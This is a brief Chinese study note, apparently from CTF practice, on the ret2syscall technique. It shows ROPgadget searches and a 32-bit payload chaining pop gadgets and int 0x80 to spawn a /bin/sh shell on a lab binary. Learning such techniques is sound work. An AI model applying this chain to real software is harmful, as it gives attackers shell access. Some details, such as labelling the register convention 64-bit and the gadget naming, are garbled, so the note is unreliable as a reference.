我们的 `ret2systemcall` 中，我们需要根据我们程序是 64 位位还是 32 位来进行对应的操作。

payload=修改寄存器+执行中断指令

## 修改寄存器部分
我们首先可以先通过我们 Linux 中带有的 `ropgadget` 来来找到我们所需要的参数，在我们的 64 位中，我们的参数会依次存放在我们的  ``ebx，ecx，edx，esi，edi ebp``。当中。

这里，我们需要用我们的 ropgadget 当中，我们才能获得我们的答案。我们可以利用我们的
```
ropgadget -binary ret2shellcode --only "pop|ret"
```

来获得我们的对应的数据，并且把我们的数据存储到对应的文本当中。
![[Pasted image 20240114172048.png]]

之后，我们还需要找到我们的 `\bin\sh` 的参数，这里，我们还是通过我们的 ROPgadget 来搜索。
![[Pasted image 20240114172933.png]]
## 执行程序
### 1. 假设我们存在 int 指令 (构造 ROP 链)
我们如果搜索后发现，我们的函数中存在我们的 int 指令，并且这个对应的参数是 `0xb` 那么我们就可以直接通过我们如下所示的 payload 来构造出我们最后的答案：
```
pop_eax=0x080bb196
pop_ebx_ecx_edx=0x0806e9b0
bin_sh=0x80BE408
int_0x80=0x08049421
payload=b'a'*112+p32(pop_eax)+p32(0xb)+p32(pop_ebx_ecx_edx)+p32(0)+p32(0)+p32(bin_sh)+p32(int_0x80)
```



